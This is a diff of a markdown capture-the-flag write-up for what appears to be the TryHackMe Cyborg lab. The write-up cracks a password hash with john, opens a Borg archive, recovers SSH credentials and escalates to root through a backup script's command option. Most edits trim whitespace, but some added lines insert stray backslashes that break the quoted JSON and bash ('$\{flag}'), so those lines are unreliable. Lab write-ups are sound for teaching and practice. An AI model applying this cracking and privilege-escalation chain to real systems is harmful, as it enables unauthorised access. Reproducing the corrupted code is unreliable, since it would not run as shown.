@@ -50,16 +50,16 @@ Let's crack it.
 ## Crack
 
 ```bash
-└─$ john passwd --wordlist=/usr/share/wordlists/rockyou.txt                                                  130 ⨯ 
-Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"                       
-Use the "--format=md5crypt-long" option to force loading these as that type instead                                
-Using default input encoding: UTF-8                                                                                
-Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3])                               
-Will run 2 OpenMP threads                                                                                          
-Press 'q' or Ctrl-C to abort, almost any other key for status                                                      
-squidward        (music_archive)                                                                                   
-1g 0:00:00:01 DONE (2022-01-15 23:24) 0.6711g/s 26158p/s 26158c/s 26158C/s wonderfull..samantha5                   
-Use the "--show" option to display all of the cracked passwords reliably                                           
+└─$ john passwd --wordlist=/usr/share/wordlists/rockyou.txt                                                  130 ⨯
+Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
+Use the "--format=md5crypt-long" option to force loading these as that type instead
+Using default input encoding: UTF-8
+Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3])
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+squidward        (music_archive)
+1g 0:00:00:01 DONE (2022-01-15 23:24) 0.6711g/s 26158p/s 26158c/s 26158C/s wonderfull..samantha5
+Use the "--show" option to display all of the cracked passwords reliably
 Session completed
 ```
 
@@ -89,12 +89,12 @@ downloaded & extracted - contains a BORG archive.
 might come in handy later:
 
 ```sh
-└─$ strings integrity.5 
+└─$ strings integrity.5
 version
 hints
-@{"algorithm": "XXH64", "digests": {"final": "05178884e81563d7"}}
+@{"algorithm": "XXH64", "digests": {"final": "05178884e81563d7"\}\}
 index
-b{"algorithm": "XXH64", "digests": {"HashHeader": "146e9cb969e480a3", "final": "b53737af67235823"}}
+b{"algorithm": "XXH64", "digests": {"HashHeader": "146e9cb969e480a3", "final": "b53737af67235823"\}\}
 ```
 
 config file
@@ -133,8 +133,8 @@ use the passwd we cracked `squidward`:
 
 ```bash
 ┌──(kali㉿kali)-[~/…/download/home/field/dev]
-└─$ borg list ./final_archive 
-Enter passphrase for key /home/kali/Documents/RxHack/THM/OFFENSIVEPENTESTPATH/CYBORG/download/home/field/dev/final_archive: 
+└─$ borg list ./final_archive
+Enter passphrase for key /home/kali/Documents/RxHack/THM/OFFENSIVEPENTESTPATH/CYBORG/download/home/field/dev/final_archive:
 music_archive                        Wed, 2020-12-30 03:00:38 [f789ddb6b0ec108d130d16adebf5713c29faf19c44cad5e1eeb8ba37277b1c82]
 ```
 
@@ -156,7 +156,7 @@ alex:S3cretP@s3
 use it to `ssh alex@10.10.148.181` and got the `user.txt` flag.
 
 ```bash
-alex@ubuntu:~$ cat user.txt 
+alex@ubuntu:~$ cat user.txt
 flag{1_hop3_y0u_ke3p_th3_arch1v3s_saf3}
 ```
 
@@ -182,8 +182,8 @@ looking through the `/etc/mp3backups/backup.sh` and this part looks the most int
 
 while getopts c: flag
 do
-  case "${flag}" in 
-    c) command=${OPTARG};;
+  case "$\{flag}" in
+    c) command=$\{OPTARG};;
   esac
 done
 
@@ -228,7 +228,7 @@ tar: /home/alex/Music/song12.mp3: Cannot stat: No such file or directory
 tar: Exiting with failure status due to previous errors
 
 Backup finished
-root@ubuntu:~# 
+root@ubuntu:~#
 ```
 
 because this spawns a shell halfway through the script, the output will be going to some other output, so we don't see the results until I exit out of the shell:
